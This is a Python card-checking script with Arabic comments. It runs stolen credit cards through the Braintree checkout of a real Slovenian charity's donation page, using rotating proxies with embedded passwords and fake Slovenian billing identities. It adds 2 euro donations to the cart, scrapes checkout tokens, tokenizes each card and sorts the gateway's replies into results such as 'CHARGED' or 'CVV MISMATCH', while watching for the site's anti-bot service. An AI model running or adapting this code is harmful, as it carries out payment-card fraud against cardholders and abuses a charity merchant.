# ==================== gatet.py (النسخة النهائية - البروكسيات الشغالة فقط) ====================

import requests, json, re, random, sys, os, time, base64, uuid
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import string

# ==================== قائمة البروكسيات الشغالة فقط ====================
PROXIES_LIST = [
    {'http': 'http://206223:Fyg3NR65@107.172.12.54:8800', 'https': 'http://206223:Fyg3NR65@107.172.12.54:8800'},
    {'http': 'http://206223:Fyg3NR65@107.172.12.5:8800', 'https': 'http://206223:Fyg3NR65@107.172.12.5:8800'},
    {'http': 'http://206223:Fyg3NR65@107.172.12.24:8800', 'https': 'http://206223:Fyg3NR65@107.172.12.24:8800'},
    {'http': 'http://206222:umh2TcPh@69.58.0.4:8800', 'https': 'http://206222:umh2TcPh@69.58.0.4:8800'},
    {'http': 'http://206223:Fyg3NR65@107.172.12.104:8800', 'https': 'http://206223:Fyg3NR65@107.172.12.104:8800'},
    {'http': 'http://206222:umh2TcPh@69.58.0.27:8800', 'https': 'http://206222:umh2TcPh@69.58.0.27:8800'},
    {'http': 'http://206222:umh2TcPh@69.58.0.24:8800', 'https': 'http://206222:umh2TcPh@69.58.0.24:8800'},
    {'http': 'http://206222:umh2TcPh@69.58.0.5:8800', 'https': 'http://206222:umh2TcPh@69.58.0.5:8800'},
    {'http': 'http://206222:umh2TcPh@69.58.0.2:8800', 'https': 'http://206222:umh2TcPh@69.58.0.2:8800'},
    {'http': 'http://206222:umh2TcPh@69.4.93.141:8800', 'https': 'http://206222:umh2TcPh@69.4.93.141:8800'},
    {'http': 'http://206222:umh2TcPh@69.4.93.152:8800', 'https': 'http://206222:umh2TcPh@69.4.93.152:8800'},
    {'http': 'http://206222:umh2TcPh@69.4.93.144:8800', 'https': 'http://206222:umh2TcPh@69.4.93.144:8800'},
    {'http': 'http://206222:umh2TcPh@69.4.93.130:8800', 'https': 'http://206222:umh2TcPh@69.4.93.130:8800'},
    {'http': 'http://206221:8bVhNtgj@85.209.138.187:8800', 'https': 'http://206221:8bVhNtgj@85.209.138.187:8800'},
    {'http': 'http://206221:8bVhNtgj@85.209.138.195:8800', 'https': 'http://206221:8bVhNtgj@85.209.138.195:8800'},
    {'http': 'http://206221:8bVhNtgj@85.209.138.239:8800', 'https': 'http://206221:8bVhNtgj@85.209.138.239:8800'},
    {'http': 'http://206221:8bVhNtgj@85.209.138.210:8800', 'https': 'http://206221:8bVhNtgj@85.209.138.210:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@45.66.238.16:8800', 'https': 'http://206224:8aTKQp6FFA7@45.66.238.16:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@107.175.117.127:8800', 'https': 'http://206224:8aTKQp6FFA7@107.175.117.127:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@107.175.117.95:8800', 'https': 'http://206224:8aTKQp6FFA7@107.175.117.95:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@45.66.238.71:8800', 'https': 'http://206224:8aTKQp6FFA7@45.66.238.71:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@107.175.117.20:8800', 'https': 'http://206224:8aTKQp6FFA7@107.175.117.20:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@45.66.238.22:8800', 'https': 'http://206224:8aTKQp6FFA7@45.66.238.22:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@45.66.238.150:8800', 'https': 'http://206224:8aTKQp6FFA7@45.66.238.150:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@45.66.238.1:8800', 'https': 'http://206224:8aTKQp6FFA7@45.66.238.1:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@107.175.117.83:8800', 'https': 'http://206224:8aTKQp6FFA7@107.175.117.83:8800'},
]

def get_random_proxy():
    """إرجاع بروكسي عشوائي من القائمة"""
    return random.choice(PROXIES_LIST)

def clean_html(text):
    """إزالة HTML tags من النص"""
    if not text:
        return ""
    clean = re.sub(r'<[^>]+>', ' ', text)
    clean = re.sub(r'\s+', ' ', clean)
    return clean.strip().lower()

def extract_reason(text):
    """استخراج السبب بعد 'Reason:'"""
    match = re.search(r'reason:\s*(.+?)(?:\.\s|$|<|$)', text, re.IGNORECASE)
    if match:
        return match.group(1).strip()
    return None

def generate_realistic_si_data():
    """توليد بيانات سلوفينية حقيقية (إيميلات Gmail فقط)"""
    
    first_names_real = ['Alenka', 'Andrej', 'Anže', 'Barbara', 'Bojan', 'Damjan', 'Danijela', 'Darja', 'David', 'Dejan',
                        'Erik', 'Franc', 'Gregor', 'Helena', 'Igor', 'Irena', 'Jan', 'Janez', 'Jure', 'Katarina',
                        'Katja', 'Luka', 'Maja', 'Marko', 'Matej', 'Matic', 'Miha', 'Milan', 'Mojca', 'Nina',
                        'Petra', 'Primož', 'Rok', 'Simona', 'Tadej', 'Tanja', 'Tina', 'Tomaž', 'Urban', 'Vesna']
    
    last_names_real = ['Novak', 'Horvat', 'Kovačič', 'Krajnc', 'Zupančič', 'Potočnik', 'Mlakar', 'Vidmar', 'Kolar', 'Čeh',
                       'Kos', 'Golob', 'Turk', 'Božič', 'Zupan', 'Petek', 'Kramar', 'Lesjak', 'Koren', 'Rožič']
    
    streets_real = ['Dunajska cesta', 'Šmartinska cesta', 'Celovška cesta', 'Tržaška cesta', 'Litijska cesta',
                    'Zaloška cesta', 'Vodnikova cesta', 'Tavčarjeva ulica', 'Gosposvetska cesta', 'Koprska ulica']
    
    cities_postcodes = [
        ('Ljubljana', '1000'), ('Maribor', '2000'), ('Celje', '3000'), ('Kranj', '4000'),
        ('Novo Mesto', '5000'), ('Koper', '6000'), ('Velenje', '3320'), ('Ptuj', '2250')
    ]
    
    phones_real = ['040123456', '041123456', '051123456', '031123456', '040987654', '041987654', '051987654']
    
    first = random.choice(first_names_real)
    last = random.choice(last_names_real)
    street = random.choice(streets_real)
    city, postal = random.choice(cities_postcodes)
    house_number = random.randint(1, 150)
    full_address = f"{street} {house_number}"
    
    random_num = random.randint(100, 9999)
    email = f"{first.lower()}.{last.lower()}{random_num}@gmail.com"
    
    companies = ['Mercator', 'Lidl', 'Hofer', 'Spar', 'Petrol', 'NLB', 'Telekom Slovenije']
    
    return {
        'first_name': first,
        'last_name': last,
        'email': email,
        'phone': random.choice(phones_real),
        'address_1': full_address,
        'city': city,
        'postcode': postal,
        'company': random.choice(companies) if random.choice([True, False]) else ''
    }

def ch(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    
    if len(yy) == 2:
        yy = '20' + yy
    
    # محاولة مع بروكسيات مختلفة (حد أقصى 3 محاولات)
    max_retries = 3
    last_error = None
    
    for attempt in range(max_retries):
        # اختيار بروكسي عشوائي
        proxy = get_random_proxy()
        proxy_ip = proxy['http'].split('@')[-1].split(':')[0] if '@' in proxy['http'] else 'unknown'
        user = generate_user_agent()
        fake_data = generate_realistic_si_data()
        session_id = str(uuid.uuid4())
        correlation_id = str(uuid.uuid4())[:24]
        
        # إنشاء جلسة مع البروكسي
        r = requests.session()
        r.proxies = proxy
        r.verify = False
        
        print(f"[*] Attempt {attempt+1}/{max_retries} - Using proxy: {proxy_ip}")
        
        # ================ بيانات الموقع ================
        SITE_URL = 'https://www.cujecnost.org'
        PRODUCT_URL = 'https://www.cujecnost.org/izdelek/donacija/'
        CHECKOUT_URL = 'https://www.cujecnost.org/blagajna/'
        AJAX_URL = 'https://www.cujecnost.org/'
        
        try:
            # ================ 1. ADD TO CART ================
            files = {
                'attribute_znesek': (None, '2 €'),
                'quantity': (None, '1'),
                'add-to-cart': (None, '2803'),
                'product_id': (None, '2803'),
                'variation_id': (None, '2837'),
            }
            
            headers_add = {
                'authority': 'www.cujecnost.org',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
                'accept-language': 'en-US,en;q=0.9',
                'origin': SITE_URL,
                'referer': PRODUCT_URL,
                'user-agent': user,
                'upgrade-insecure-requests': '1',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'Connection': 'close',
            }
            
            response = r.post(PRODUCT_URL, headers=headers_add, files=files, timeout=20)
            if response.status_code != 200:
                print(f"[!] Add to cart failed with proxy {proxy_ip}, retrying...")
                continue
            
            # ================ 2. CHECKOUT PAGE ================
            headers_checkout = {
                'Referer': 'https://www.cujecnost.org/kosarica/',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': user,
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'Connection': 'close',
            }
            
            response = r.get(CHECKOUT_URL, headers=headers_checkout, timeout=20)
            if response.status_code != 200:
                print(f"[!] Checkout page failed with proxy {proxy_ip}, retrying...")
                continue
            
            # ================ 3. EXTRACT TOKENS AND NONCES ================
            enc = None
            
            match = re.search(r'name="wc-braintree-client-token"\s+value="([^"]+)"', response.text)
            if match:
                enc = match.group(1)
            
            if not enc:
                match = re.search(r'data-braintree-client-token="([^"]+)"', response.text)
                if match:
                    enc = match.group(1)
            
            if not enc:
                match = re.search(r'wc_braintree_client_token\s*=\s*\["(.*?)"\]', response.text)
                if match:
                    enc = match.group(1)
            
            if not enc:
                print(f"[!] Client token not found with proxy {proxy_ip}, retrying...")
                continue
            
            dec = base64.b64decode(enc).decode('utf-8')
            au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
            if not au:
                print(f"[!] Fingerprint not found with proxy {proxy_ip}, retrying...")
                continue
            au = au[0]
            
            sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text)
            if not sec:
                sec = '5a3c42815a'
            else:
                sec = sec.group(1)
            
            check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text)
            if not check:
                check = '57e13160b1'
            else:
                check = check.group(1)
            
            # ================ 4. UPDATE ORDER REVIEW ================
            billing_first = fake_data['first_name']
            billing_last = fake_data['last_name']
            billing_email = fake_data['email']
            billing_phone = fake_data['phone']
            billing_address = fake_data['address_1']
            billing_city = fake_data['city']
            billing_postcode = fake_data['postcode']
            billing_company = fake_data['company']
            
            headers_update = {
                'authority': 'www.cujecnost.org',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': SITE_URL,
                'referer': CHECKOUT_URL,
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'Connection': 'close',
            }
            
            params_update = {'wc-ajax': 'update_order_review'}
            
            data_update = f'security={sec}&payment_method=braintree_cc&country=SI&state=&postcode=&city=&address=&address_2=&s_country=SI&s_state=&s_postcode=&s_city=&s_address=&s_address_2=&has_full_address=false&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3Dhttps%253A%252F%252Fwww.cujecnost.org%252F%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fwww.cujecnost.org%252Fdobrodelna-trgovina%252F%26wc_order_attribution_session_start_time%3D2026-05-21%252013%253A53%253A23%26wc_order_attribution_session_pages%3D8%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3D{user}%26billing_first_name%3D%26billing_last_name%3D%26billing_company%3D%26billing_country%3DSI%26billing_address_1%3D%26billing_address_2%3D%26billing_postcode%3D%26billing_city%3D%26billing_state%3D%26billing_phone%3D%26billing_email%3D%26order_comments%3D%26payment_method%3Dbraintree_cc%26braintree_cc_nonce_key%3D%26braintree_cc_device_data%3D%26braintree_cc_3ds_nonce_key%3D%26braintree_cc_config_data%3D%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252Fblagajna%252F'
            
            response = r.post(AJAX_URL, params=params_update, headers=headers_update, data=data_update, timeout=20)
            
            # ================ 5. TOKENIZE CREDIT CARD ================
            headers_token = {
                'authority': 'payments.braintree-api.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': f'Bearer {au}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'user-agent': user,
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
            }
            
            token_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': session_id,
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear } } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': n,
                            'expirationMonth': mm,
                            'expirationYear': yy,
                            'cvv': cvc,
                            'billingAddress': {
                                'postalCode': billing_postcode,
                                'streetAddress': billing_address[:50],
                            },
                        },
                        'options': {'validate': False},
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            
            response = requests.post('https://payments.braintree-api.com/graphql', headers=headers_token, json=token_data, timeout=20)
            tok = response.json()['data']['tokenizeCreditCard']['token']
            
            # ================ 6. FINAL CHECKOUT ================
            headers_final = {
                'authority': 'www.cujecnost.org',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': SITE_URL,
                'referer': CHECKOUT_URL,
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'Connection': 'close',
            }
            
            params_final = {'wc-ajax': 'checkout'}
            
            data_final = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fwww.cujecnost.org%2F&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fwww.cujecnost.org%2Fdobrodelna-trgovina%2F&wc_order_attribution_session_start_time=2026-05-21+13%3A53%3A23&wc_order_attribution_session_pages=8&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&billing_first_name={billing_first}&billing_last_name={billing_last}&billing_company={billing_company}&billing_country=SI&billing_address_1={billing_address.replace(" ", "+")}&billing_address_2=&billing_postcode={billing_postcode}&billing_city={billing_city}&billing_state=&billing_phone={billing_phone}&billing_email={billing_email}&order_comments=&payment_method=braintree_cc&braintree_cc_nonce_key={tok}&braintree_cc_device_data=&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Ftybxztwjmywkbkg7%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Ftybxztwjmywkbkg7%22%7D%2C%22merchantId%22%3A%22tybxztwjmywkbkg7%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22challenges%22%3A%5B%22cvv%22%2C%22postal_code%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22American+Express%22%2C%22Discover%22%2C%22Maestro%22%2C%22MasterCard%22%2C%22Visa%22%5D%7D%2C%22threeDSecureEnabled%22%3Atrue%2C%22threeDSecure%22%3A%7B%22cardinalAuthenticationJWT%22%3A%22eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI0ZDY3ODQ3OC04OGUwLTQxNTItOWI4MS1hMmY0NGExNGIzOTkiLCJpYXQiOjE3NzkzNzE0NzEsImV4cCI6MTc3OTM3ODY3MSwiaXNzIjoiNWM4YWFjNzk4MjNjMTYyZGMwM2ZiMWY2IiwiT3JnVW5pdElkIjoiNWM4YWFjNzg4MjNjMTYyZGMwM2ZiMWYzIn0.o75N8rlGSQ6mFKo15lO2l7QqIUOffLgKYzOYeVKTvIs%22%2C%22cardinalSongbirdUrl%22%3A%22https%3A%2F%2Fsongbird.cardinalcommerce.com%2Fedge%2Fv1%2Fsongbird.js%22%2C%22cardinalSongbirdIdentityHash%22%3Anull%7D%2C%22paypalEnabled%22%3Afalse%7D&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'
            
            response = r.post(AJAX_URL, params=params_final, headers=headers_final, data=data_final, timeout=20)
            
            # ================ 7. PARSE RESULT ================
            try:
                result_data = json.loads(response.text)
                messages = result_data.get("messages", "")
                full_response = response.text
            except:
                return 'PARSE_ERROR'
            
            clean_messages = clean_html(messages)
            clean_full = clean_html(full_response)
            search_text = clean_messages + " " + clean_full
            
            reason_match = re.search(r'reason:\s*([^\.]+)', search_text)
            reason = reason_match.group(1).strip() if reason_match else None
            
            print(f"[DEBUG] Clean response: {search_text[:300]}")
            
            # ==================== ردود Braintree الكاملة ====================
            
            if 'charged' in search_text or 'success' in search_text or 'completed' in search_text or 'approved' in search_text:
                return 'CHARGED'
            
            if 'insufficient funds' in search_text or 'insufficient_funds' in search_text:
                return 'INSUFFICIENT FUNDS'
            
            if 'cvv' in search_text or 'cvv2 failure' in search_text or 'cvv mismatch' in search_text:
                return 'CVV MISMATCH'
            
            if 'expired card' in search_text or 'expired_card' in search_text:
                return 'EXPIRED CARD'
            
            if 'fraud' in search_text or 'suspected fraud' in search_text:
                return 'SUSPECTED FRAUD'
            
            if 'do not honor' in search_text or 'do_not_honor' in search_text:
                return 'DO NOT HONOR'
            
            if 'closed card' in search_text or 'card closed' in search_text:
                return 'CLOSED CARD'
            
            if 'call issuer' in search_text or 'pick up card' in search_text or 'pickup card' in search_text:
                return 'CALL ISSUER - PICKUP CARD'
            
            if '3d secure' in search_text or 'three_d_secure' in search_text or '3ds' in search_text:
                return '3D SECURE REQUIRED'
            
            if 'limit exceeded' in search_text or 'exceeds limit' in search_text:
                return 'LIMIT EXCEEDED'
            
            if 'lost or stolen' in search_text or 'stolen card' in search_text:
                return 'LOST/STOLEN CARD'
            
            if 'address verification' in search_text or 'avs' in search_text or 'postal code mismatch' in search_text:
                return 'ADDRESS MISMATCH'
            
            if 'processor declined' in search_text or 'processor_declined' in search_text:
                return 'PROCESSOR DECLINED'
            
            if 'invalid card' in search_text or 'card number invalid' in search_text:
                return 'INVALID CARD'
            
            if 'cannot authorize' in search_text or 'not authorized at this time' in search_text:
                return 'CANNOT AUTHORIZE (POLICY)'
            
            if 'transaction not allowed' in search_text:
                return 'TRANSACTION NOT ALLOWED'
            
            if 'processor declined fraud' in search_text or 'fraud suspect' in search_text:
                return 'PROCESSOR DECLINED - FRAUD SUSPECT'
            
            if 'cleantalk' in search_text or 'antispam' in search_text or 'ct_bot_detector' in search_text:
                return 'CLEANTALK SUSPECT'
            
            if 'card not activated' in search_text:
                return 'CARD NOT ACTIVATED'
            
            # الردود الجديدة
            if 'no account' in search_text or 'no_account' in search_text or 'account not found' in search_text:
                return 'NO ACCOUNT'
            
            if 'card restricted' in search_text or 'restricted card' in search_text:
                return 'CARD RESTRICTED'
            
            if 'veljaven' in search_text or 'e-poštni' in search_text:
                return 'INVALID EMAIL ADDRESS'
            
            if 'declined' in search_text:
                return 'DECLINED'
            
            if reason and len(reason) < 60:
                return reason.upper()
            
            if clean_messages and len(clean_messages) < 100:
                return clean_messages.title()
            
            return 'DECLINED'
            
        except Exception as e:
            last_error = str(e)[:50]
            print(f"[!] Proxy {proxy_ip} failed: {last_error}")
            if attempt == max_retries - 1:
                return f'PROXY_ERROR: {last_error}'
            continue
    
    return f'PROXY_ERROR: {last_error}'